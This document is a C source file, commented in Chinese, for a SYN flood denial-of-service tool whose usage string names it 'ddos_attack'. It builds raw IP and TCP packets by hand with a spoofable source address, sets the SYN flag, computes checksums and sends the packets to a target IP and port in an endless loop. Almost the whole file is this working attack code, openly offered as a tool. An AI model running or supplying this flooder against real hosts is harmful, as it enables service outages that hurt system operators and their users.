#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <errno.h>
#include <arpa/inet.h>
#include <linux/tcp.h>
#include <pthread.h>
#include <fcntl.h>

//定义TCP伪报头
typedef struct psd_hdr
{
  unsigned long saddr; //源地址
  unsigned long daddr; //目的地址
  char mbz;
  char ptcl;           //协议类型
  unsigned short tcpl; //TCP长度

} PSD_HEADER;

//定义TCP报头
typedef struct _tcphdr
{
  unsigned short th_sport; //16位源端口
  unsigned short th_dport; //16位目的端口
  unsigned int th_seq;     //32位序列号
  unsigned int th_ack;     //32位确认号
  unsigned char th_lenres; //4位首部长度/4位保留字
  unsigned char th_flag;   //6位标志位
  unsigned short th_win;   //16位窗口大小
  unsigned short th_sum;   //16位校验和
  unsigned short th_urp;   //16位紧急数据偏移量

} TCP_HEADER;

//定义IP报头
typedef struct _iphdr
{
  unsigned char h_lenver;        //长度加版本号
  unsigned char tos;             //服务类型
  unsigned short total_len;      //报文长度
  unsigned short ident;          //标示，可以置为0
  unsigned short frag_and_flags; //标志位
  unsigned char ttl;             //生存期
  unsigned char proto;           //协议字段
  unsigned short checksum;       //校验和
  unsigned int sourceIP;         //源IP
  unsigned int destIP;           //目的IP

} IP_HEADER;

// 计算校验和
unsigned short checksum(unsigned short *addr, int len)
{
  int nleft = len;
  int sum = 0;
  unsigned short *w = addr;
  unsigned short answer = 0;

  while (nleft > 1)
  {
    sum += *w++;
    nleft -= 2;
  }

  if (nleft == 1)
  {
    *(unsigned char *)(&answer) = *(unsigned char *)w;
    sum += answer;
  }

  sum = (sum >> 16) + (sum & 0xffff);
  sum += (sum >> 16);
  answer = ~sum;
  return (answer);
}

void attack(int skfd, struct sockaddr_in *target, unsigned short srcport)
{
  char buf[65535] = {0};
  struct _iphdr ip;
  struct _tcphdr tcp;
  int ip_len;
  struct psd_hdr psdheader;
  struct sockaddr_in srcaddr;
  srcaddr.sin_addr.s_addr = inet_addr("10.10.20.132");

  struct sockaddr_in _target;
  _target.sin_family = AF_INET;
  _target.sin_port = target->sin_port;
  _target.sin_addr.s_addr = target->sin_addr.s_addr;

  ip_len = sizeof(struct iphdr) + sizeof(struct tcphdr);

  //开始填充IP首部
  ip.h_lenver = (4 << 4 | sizeof(ip) / sizeof(unsigned long));
  ip.total_len = htons(sizeof(tcp) + sizeof(ip));
  //ip包的目的IP地址
  ip.destIP = target->sin_addr.s_addr;
  //ip 包的源IP地址（可以伪造）
  ip.sourceIP = srcaddr.sin_addr.s_addr;
  //上层协议  TCP
  ip.proto = IPPROTO_TCP;
  //3位标志位  可以分段DF=0  后面无包MF=0
  ip.frag_and_flags = 0;
  //16位校验和
  ip.checksum = 0;
  //存活期   MAXTTL
  ip.ttl = 128;
  //16位标识
  ip.ident = 1;

  //开始填充TCP首部
  //填充TCP
  //目的端口
  tcp.th_dport = target->sin_port;
  //源端口
  tcp.th_sport = htons(50000);
  //序列号
  tcp.th_seq = htonl(0x1245678);
  //确认号
  tcp.th_ack = 0;
  //（4位首部长度/4位保留字）
  tcp.th_lenres = (sizeof(tcp) / 4 << 4 | 0);
  //SYN标志
  tcp.th_flag = 2; //SYN
  //滑动窗口
  tcp.th_win = htons(16384);
  //16位紧急数据偏移量
  tcp.th_urp = 0;
  //16位校验和
  tcp.th_sum = 0;

  //TCP伪头
  psdheader.mbz = 0;
  psdheader.daddr = target->sin_addr.s_addr;
  psdheader.saddr = srcaddr.sin_addr.s_addr;
  psdheader.ptcl = IPPROTO_TCP;
  psdheader.tcpl = htons(sizeof(tcp));

  //计算校验和
  memcpy(buf, &psdheader, sizeof(psdheader));
  memcpy(buf + sizeof(psdheader), &tcp, sizeof(tcp));
  tcp.th_sum = checksum((unsigned short *)buf, sizeof(psdheader) + sizeof(tcp));

  //IP校验和
  memcpy(buf, &ip, sizeof(ip));
  memcpy(buf + sizeof(ip), &tcp, sizeof(tcp));
  ip.checksum = checksum((unsigned short *)buf, sizeof(ip) + sizeof(tcp));

  memcpy(buf, &ip, sizeof(ip));

  //payload
  int len = sizeof(buf) - sizeof(ip) - sizeof(tcp);
  printf("here===>%d\n", len);
  char payload[len];
  int i = 0;
  for (i = 0; i < len; i++)
  {
    payload[i] = '2';
  }
  memcpy(buf + sizeof(ip) + sizeof(tcp), payload, sizeof(payload));

  //send package
  for (;;)
  {

    if (sendto(skfd, buf, sizeof(tcp) + sizeof(ip), 0, (struct sockaddr *)&_target, sizeof(_target)) == -1)
    {
      printf("send error:%s!\n", strerror(errno));
      exit(-1);
    }
    else
    {
      printf("send OK!\n");
    }
  } //for
}
int main(int args, char *argv[])
{
  if (args != 4)
  {
    printf("Usage:ddos_attack targetIP targetPort srcPort\n");
    exit(-1);
  }

  int skfd;
  struct sockaddr_in target;
  const int on = 1;
  unsigned short srcport;

  memset(&target, 0, sizeof(target));

  //填写目标信息
  target.sin_family = AF_INET;
  target.sin_port = htons(atoi(argv[2]));
  target.sin_addr.s_addr = inet_addr(argv[1]);

  //创建一个原生socket
  if ((skfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) < 0)
  {
    printf("create socket failed!%s\n", strerror(errno));
    exit(-1);
  }

  //用模板代码来开启IP_HDRINCL特性，我们完全自己手动构造IP报文
  if (0 > setsockopt(skfd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)))
  {
    perror("IP_HDRINCL failed");
    exit(1);
  }

  //启动攻击函数
  srcport = atoi(argv[3]);
  attack(skfd, &target, srcport);
  close(skfd);
  return 0;
}
